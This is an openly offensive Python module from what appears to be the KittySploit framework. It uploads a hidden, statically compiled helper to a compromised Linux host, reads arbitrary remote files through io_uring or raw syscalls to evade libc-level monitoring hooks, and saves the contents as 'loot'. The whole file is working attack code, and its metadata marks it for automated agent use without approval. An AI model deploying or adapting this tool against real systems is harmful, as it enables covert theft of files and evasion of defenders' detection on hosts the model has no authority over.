#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Read a remote Linux file via an io_uring helper (syscall fallback)."""

from __future__ import annotations

import base64
import os
import re
import subprocess
import tempfile

from kittysploit import *
from core.lib.compiler.zig_compiler import ZigCompiler
from core.utils.paths import data_dir
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin

MARK_START = "__KS_URING_START__"
MARK_END = "__KS_URING_END__"

_ARCH_MAP = {
    "x86_64": "x64",
    "amd64": "x64",
    "i386": "x86",
    "i686": "x86",
    "aarch64": "arm64",
    "arm64": "arm64",
    "armv7l": "arm",
    "armv6l": "arm",
}

# Static musl triples — gnu + -static fails with zig cc.
_MUSL_TRIPLE = {
    "x64": "x86_64-linux-musl",
    "x86": "i386-linux-musl",
    "arm64": "aarch64-linux-musl",
    "arm": "arm-linux-musleabi",
}


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Linux io_uring File Read",
        "description": (
            "Upload a small helper that reads a remote file via io_uring "
            "(OPENAT/READV/CLOSE), falling back to raw syscalls if needed. "
            "Useful to bypass userland libc hooks that only intercept open/read/cat."
        ),
        "platform": Platform.LINUX,
        "author": ["KittySploit Team"],
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [
            "https://attack.mitre.org/techniques/T1005/",
            "https://man7.org/linux/man-pages/man2/io_uring_setup.2.html",
        ],
        "agent": {
            "risk": "passive",
            "effects": ["discovery"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["evidence"],
            "cost": 1.2,
            "noise": 0.3,
            "value": 1.1,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": ["shell"],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "rpath"}],
                "consumes_capabilities": [{"capability": "shell", "from_detail": ""}],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    rpath = OptString("", "Remote file path to read", required=True)
    remote_helper = OptString(
        "/tmp/.ks_uring_read",
        "Remote path for the uploaded helper binary",
        required=False,
    )
    target_arch = OptString(
        "auto",
        "Target architecture (auto, x64, x86, arm64, arm)",
        required=False,
    )
    encode = OptBool(
        True,
        "Base64-encode payload in the helper (safer through shell sessions)",
        required=False,
    )
    force_syscall = OptBool(
        False,
        "Skip io_uring and force raw openat/read syscalls",
        required=False,
    )
    save_loot = OptBool(True, "Save file contents under ./loot", required=False)
    cleanup = OptBool(True, "Remove the remote helper after execution", required=False)
    timeout = OptInteger(
        60,
        "Command timeout in seconds (0 = default)",
        required=False,
        advanced=True,
    )

    def check(self):
        if not self.linux_require_linux():
            return False

        rpath = str(self.rpath or "").strip()
        if not rpath:
            print_error("RPATH is required")
            return False
        if not self.linux_file_exists(rpath):
            # Still allow directories / special files via test -r
            q = self.linux_shell_quote(rpath)
            readable = self.linux_execute(f"test -r {q} && echo OK || echo NO")
            if "OK" not in readable:
                print_error(f"Remote path not readable: {rpath}")
                return False

        disabled = self.linux_execute(
            "cat /proc/sys/kernel/io_uring_disabled 2>/dev/null || echo 0"
        ).strip()
        if disabled.startswith("2") and not bool(self.force_syscall):
            print_warning(
                "io_uring is fully disabled on target (io_uring_disabled=2); "
                "set FORCE_SYSCALL true or the helper will fall back to syscalls"
            )
        elif disabled.startswith("1"):
            print_status("io_uring restricted to privileged users (io_uring_disabled=1)")

        arch = self._resolve_arch()
        if not arch:
            print_error("Could not resolve target architecture")
            return False
        print_status(f"Target architecture: {arch}")
        return True

    def run(self):
        if not self.check():
            return False

        rpath = str(self.rpath).strip()
        remote_helper = str(self.remote_helper or "/tmp/.ks_uring_read").strip()
        arch = self._resolve_arch()

        c_path = data_dir() / "helpers" / "linux" / "uring_file_read.c"
        if not c_path.is_file():
            print_error(f"Helper source missing: {c_path}")
            return False
        c_source = c_path.read_text(encoding="utf-8")

        compiler = ZigCompiler()
        if not compiler.is_available():
            print_error("Zig compiler not found. Install Zig to build the helper.")
            return False

        print_status(f"Compiling io_uring file-read helper for {arch}...")
        binary = self._compile_helper(compiler, c_source, arch)
        if not binary:
            return False

        print_status(f"Uploading helper ({len(binary)} bytes) -> {remote_helper}")
        if not self.linux_upload_bytes(binary, remote_helper, executable=True):
            return False
        print_success(f"Helper ready: {remote_helper}")

        try:
            content = self._run_helper(remote_helper, rpath)
            if content is None:
                return False

            self._present(rpath, content)
            if bool(self.save_loot):
                self._save_loot(rpath, content)
            return True
        finally:
            if bool(self.cleanup):
                self.linux_delete_remote([remote_helper])

    def _resolve_arch(self) -> str:
        requested = str(self.target_arch or "auto").strip().lower()
        if requested and requested != "auto":
            return requested
        raw = (self.linux_execute("uname -m 2>/dev/null") or "").strip().lower()
        token = raw.splitlines()[-1].strip() if raw else ""
        return _ARCH_MAP.get(token, "")

    def _compile_helper(self, compiler: ZigCompiler, c_source: str, arch: str) -> bytes | None:
        triple = _MUSL_TRIPLE.get(arch)
        if not triple:
            print_error(f"Unsupported architecture for helper build: {arch}")
            return None

        with tempfile.TemporaryDirectory(prefix="ks_uring_") as tmp_dir:
            src = os.path.join(tmp_dir, "uring_file_read.c")
            out = os.path.join(tmp_dir, "uring_file_read")
            with open(src, "w", encoding="utf-8") as handle:
                handle.write(c_source)

            env = os.environ.copy()
            env.setdefault("ZIG_LOCAL_CACHE_DIR", os.path.join(tmp_dir, "zig-cache"))
            env.setdefault("ZIG_GLOBAL_CACHE_DIR", os.path.join(tmp_dir, "zig-global-cache"))

            cmd = [
                compiler.zig_path,
                "cc",
                "-target",
                triple,
                src,
                "-o",
                out,
                "-static",
                "-Os",
                "-s",
            ]
            print_info(f"Compiling for target: {triple}")
            try:
                result = subprocess.run(
                    cmd,
                    env=env,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
            except Exception as exc:
                print_error(f"Compilation error: {exc}")
                return None

            if result.returncode != 0 or not os.path.isfile(out):
                err = (result.stderr or result.stdout or "").strip()
                print_error(f"Compilation failed: {err[:2000]}")
                return None

            with open(out, "rb") as handle:
                return handle.read()

    def _run_helper(self, remote_helper: str, rpath: str):
        parts = [self.linux_shell_quote(remote_helper)]
        if bool(self.encode):
            parts.append("--base64")
        if bool(self.force_syscall):
            parts.append("--syscall")
        parts.append(self.linux_shell_quote(rpath))
        cmd = " ".join(parts)

        timeout = self.linux_int_opt(self.timeout, 60, minimum=0)
        print_status(f"Executing: {cmd}")
        output = self.linux_execute(cmd, timeout=timeout)
        if not output:
            print_error("No output from helper (timeout, crash, or empty file?)")
            return None

        payload = self._extract_payload(output)
        if payload is None:
            print_error("Could not find payload markers in helper output")
            print_info(output[:2000])
            return None

        if bool(self.encode):
            clean = re.sub(r"\s+", "", payload)
            try:
                return base64.b64decode(clean)
            except Exception as exc:
                print_error(f"Base64 decode failed: {exc}")
                return None
        return payload.encode("utf-8", errors="surrogateescape")

    @staticmethod
    def _extract_payload(output: str):
        start = output.find(MARK_START)
        end = output.find(MARK_END)
        if start < 0 or end < 0 or end <= start:
            return None
        body = output[start + len(MARK_START):end]
        # Strip framing newlines around markers only (keep file content intact).
        if body.startswith("\r\n"):
            body = body[2:]
        elif body.startswith("\n"):
            body = body[1:]
        if body.endswith("\r\n"):
            body = body[:-2]
        elif body.endswith("\n"):
            body = body[:-1]
        return body

    def _present(self, rpath: str, content: bytes) -> None:
        print_success(f"Read {len(content)} bytes from {rpath}")
        preview_limit = 4000
        try:
            text = content.decode("utf-8")
            sample = text[:200]
            if all(32 <= ord(ch) <= 126 or ch in "\t\n\r" for ch in sample):
                print_info("--- file content ---")
                print(text if len(text) <= preview_limit else text[:preview_limit])
                if len(text) > preview_limit:
                    print_warning(f"... truncated preview ({len(content)} bytes total)")
                return
        except UnicodeDecodeError:
            pass

        print_info(f"Binary/non-text content ({len(content)} bytes); preview as hex:")
        print(content[:256].hex())

    def _save_loot(self, rpath: str, content: bytes) -> None:
        host = (self.linux_execute("hostname 2>/dev/null") or "linux").strip()
        host = host.splitlines()[-1].strip() if host else "linux"
        safe_host = re.sub(r"[^a-zA-Z0-9._-]+", "_", host) or "linux"
        safe_name = re.sub(r"[^a-zA-Z0-9._-]+", "_", os.path.basename(rpath)) or "file"
        out_rel = os.path.join("loot", f"uring_read_{safe_host}_{safe_name}")
        full_path = self.output_dir_path(out_rel)

        try:
            parent = os.path.dirname(full_path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(full_path, "wb") as handle:
                handle.write(content)
            print_success(f"Saved loot to {full_path}")
        except Exception as exc:
            print_warning(f"Could not save loot: {exc}")
